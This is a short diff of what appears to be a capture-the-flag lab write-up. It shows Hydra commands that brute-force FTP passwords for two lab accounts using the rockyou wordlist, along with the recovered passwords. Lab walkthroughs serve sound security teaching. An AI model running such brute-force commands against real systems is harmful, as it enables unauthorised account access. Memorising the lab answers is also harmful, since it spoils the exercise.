@@ -46,9 +46,11 @@ R= vsftpd 3.0.5
 7. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?
 
 hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021
+
 password: jordan
 
 hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021
+
 password: andrea
 
 ![image](https://github.com/user-attachments/assets/902f0a67-e3e4-44cb-bc21-c5563311a160)
